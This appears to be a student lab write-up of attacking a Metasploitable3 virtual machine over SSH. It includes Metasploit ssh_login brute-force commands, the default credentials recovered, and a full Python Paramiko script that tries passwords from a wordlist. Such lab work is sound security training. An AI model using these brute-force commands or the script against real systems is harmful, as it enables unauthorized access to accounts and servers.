# Phase 1: Attack Execution

## Network Info

- **Metasploitable3 IP:** `192.168.56.101`
- **Attacker (Kali) IP:** `192.168.56.102`

## ✅ Task 1.1: Compromise Using Metasploit

We targeted SSH (port 22) using brute force:

```bash
msfconsole
use auxiliary/scanner/ssh/ssh_login
show options
set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
set user_file /usr/share/wordlists/metasploit/unix_users.txt
set rhosts 192.168.56.101
exploit

Result: Found valid SSH credentials:

Username: vagrant
Password: vagrant

We then upgraded to Meterpreter for better control.

# ✅ Task 1.2: Compromise Using a Custom Script

This document explains the process of automating the attack on the **Metasploitable3** SSH service (port 22) using a **custom Python script**. The goal was to replicate the brute-force attack without relying on Metasploit and provide a clear proof of concept.

---

## 🖥️ Environment Setup

- **Victim (Metasploitable3) IP:** `192.168.56.101`
- **Attacker (Kali Linux) IP:** `192.168.56.102`
- **Target Service:** SSH (Port 22)

---

## 🔨 The Custom Python Script

We developed a Python script using the **Paramiko** library to perform an SSH brute-force attack. The script attempts multiple passwords from a wordlist and reports successful logins.

### 📂 Script: `ssh_brute.py`

```python
import paramiko

def ssh_brute(host, username, password_list):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in password_list:
        try:
            client.connect(host, username=username, password=password.strip())
            print(f"[+] Success: {username}:{password.strip()}")
            client.close()
            return True
        except:
            print(f"[-] Failed: {username}:{password.strip()}")
    return False

if __name__ == "__main__":
    target_ip = "192.168.56.101"
    username = "vagrant"
    with open("/usr/share/wordlists/metasploit/unix_passwords.txt", "r") as file:
        passwords = file.readlines()
    ssh_brute(target_ip, username, passwords)
